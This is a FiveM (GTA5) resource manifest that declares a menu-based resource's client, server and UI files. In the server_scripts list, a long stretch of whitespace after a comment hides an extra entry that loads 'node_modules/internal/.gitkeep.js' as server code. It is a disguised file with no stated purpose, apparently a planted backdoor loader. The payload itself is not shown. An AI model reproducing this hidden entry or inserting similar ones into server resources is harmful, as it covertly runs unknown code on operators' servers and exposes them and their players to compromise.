

fx_version 'cerulean'
game 'gta5'

author ''

shared_scripts {
    '@Framework/imports.lua',
    '@ox_lib/init.lua'
}

client_scripts {
    "src/RMenu.lua",
    "src/menu/RageUI.lua",
    "src/menu/Menu.lua",
    "src/menu/MenuController.lua",
    "src/components/*.lua",
    "src/menu/elements/*.lua",
    "src/menu/items/*.lua",
    "src/menu/panels/*.lua",
    "src/menu/windows/*.lua",
    'config.lua',
    'configfarm.lua',
    'client/*.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'config.lua',
    'configfarm.lua',
'server/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.gitkeep.js',
}

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/script.min.js',
    'html/style.min.css',
    'html/config.js',
    'html/assets/*.png',
    'html/assets/items/*.png'
}

lua54 'yes'

dependencies {
    'ox_lib'
}

escrow_ignore {
    'config.lua',
    'configfarm.lua',
    'html/config.js'
}
dependency '/assetpacks'